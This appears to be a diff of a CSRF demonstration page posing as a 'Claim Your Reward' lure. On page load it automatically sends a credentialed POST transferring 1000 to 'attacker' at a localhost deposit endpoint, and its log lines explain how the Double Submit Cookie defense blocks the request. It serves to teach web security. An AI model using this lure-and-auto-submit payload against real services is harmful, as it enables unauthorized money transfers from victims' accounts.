@@ -1,9 +1,7 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
     <title>🎁 Claim Your Reward</title>
     <style>
       body {
@@ -58,15 +56,19 @@
       <p>We're verifying your account...</p>
     </div>
 
-    <form id="csrfForm" class="hidden" action="http://localhost:3001/deposit" method="POST" target="hidden_iframe">
-      <input type="hidden" name="to" value="attacker">
-      <input type="hidden" name="amount" value="1000">
+    <form
+      id="csrfForm"
+      class="hidden"
+      action="http://localhost:3001/deposit"
+      method="POST"
+      target="hidden_iframe"
+    >
+      <input type="hidden" name="to" value="attacker" />
+      <input type="hidden" name="amount" value="1000" />
     </form>
     <iframe name="hidden_iframe" class="hidden"></iframe>
 
-    <div class="log" id="logBox">
-      &gt; 🛠️ Developer Panel (Demo only)<br>
-    </div>
+    <div class="log" id="logBox">&gt; 🛠️ Developer Panel (Demo only)<br /></div>
 
     <script>
       // Append a nicely formatted log line to the developer panel
@@ -93,9 +95,10 @@
             method: "POST",
             credentials: "include",
             headers: {
-              "Content-Type": "application/json"
+              "Content-Type": "application/json",
+              "x-csrf-token": "invalid-or-missing",
             },
-            body: JSON.stringify({ to, amount })
+            body: JSON.stringify({ to, amount }),
           });
 
           const text = await res.text();
@@ -103,8 +106,7 @@
           if (res.ok) {
             log("✅ Server responded (OK): " + text);
           } else {
-            // Non-2xx status - attack blocked or error
-            log("❌ CSRF attack blocked (HTTP " + res.status + ") — the server rejected this request due to missing/invalid CSRF token.");
+            log("❌ CSRF attack blocked (HTTP " + res.status + "): " + text);
           }
         } catch (err) {
           log("❌ Network error/fetch failed: " + err.message);
@@ -113,6 +115,10 @@
 
       // Keep the original form available (hidden) but use fetch attack for clearer logs
       window.addEventListener("load", () => {
+        log("💡 This demo uses the Double Submit Cookie pattern.");
+        log(
+          "💡 The attacker cannot access cookies, so the x-csrf-token header is invalid."
+        );
         log("Page loaded.");
         // Delay briefly to simulate realistic user wait, then trigger
         setTimeout(() => {
